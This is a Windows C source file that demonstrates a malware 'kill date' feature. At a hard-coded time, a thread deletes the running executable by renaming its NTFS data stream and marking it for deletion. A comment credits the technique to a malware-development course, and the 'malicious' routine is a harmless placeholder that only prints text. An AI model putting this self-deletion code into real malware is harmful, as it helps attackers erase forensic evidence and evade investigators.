#include <windows.h>
#include <stdio.h>
#include <time.h>

#define MONTH(x) (x-1)
#define YEAR(x) (x-1900)


// Malware kill and deletion date
struct tm deletionDate {
	37,			// seconds after the minute - [0, 60] including leap second
	36,			// minutes after the hour - [0, 59]
	21,			// hours since midnight - [0, 23]
	22,			// day of the month - [1, 31]
	MONTH(9),   // months since January - [0, 11]
	YEAR(2024),	// years since 1900
	0,			// days since Sunday - [0, 6]
	0,			// days since January 1 - [0, 365]
	1			// daylight savings time flag (set it correctly, otherwise time is shifted by 1 hour)
};



// Taken from Maldev academy module 72, use an alternative NTFS data stream to delete the file even if it is opened by some process (e.g. the current one)

// The new data stream name
#define NEW_STREAM L":Maldev"

BOOL DeleteSelf() {


	WCHAR                       szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO       Delete = { 0 };
	HANDLE                      hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO           pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
	SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;


	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = (PFILE_RENAME_INFO) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Cleaning up some structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//----------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = StreamLength;
	RtlCopyMemory(pRename->FileName, NewStream, StreamLength);

	//----------------------------------------------------------------------------------------

	// Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//----------------------------------------------------------------------------------------
	// RENAMING

	// Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

	// Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------
	// DELETING

	// Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...");

	// Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}


/*
 * Functions that kills the process and deletes the exe at deletion date/time.
 */
void selfDeleteAtDate() {
	time_t now, killTime, delta;
	time(&now);
	killTime = mktime(&deletionDate);
	printf("Deletion Date:\t%04d-%02d-%02d %02d:%02d:%02d\n", deletionDate.tm_year+1900, deletionDate.tm_mon+1, deletionDate.tm_mday, deletionDate.tm_hour, deletionDate.tm_min, deletionDate.tm_sec);
	delta = killTime - now;
	if (delta <= 0) {
		printf("[+] Killing immediately\n");
		DeleteSelf();
		exit(0);
	}
	else {
		printf("[*] Need to wait %lld seconds...\n", delta);
		// wait until the deletion date/time
		WaitForSingleObject((HANDLE)-1, delta * 1000);
		printf("[+] DRIN DRIN\n");
		DeleteSelf();
		exit(0);
	}
}

/*
 * Functions that prints stuff every second.
 */
void maliciousStuff() {
	SYSTEMTIME currentTime;
	while (true) {
		GetLocalTime(&currentTime);
		printf("[%04u-%02u-%02u %02u:%02u:%02u] Cooking\n", currentTime.wYear, currentTime.wMonth, currentTime.wDay, currentTime.wHour, currentTime.wMinute, currentTime.wSecond);
		WaitForSingleObject((HANDLE)-1, 1000);
	}
}


int main() {
	// create thread that kills the program at deletion date
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)selfDeleteAtDate, NULL, NULL, NULL);
	maliciousStuff();
}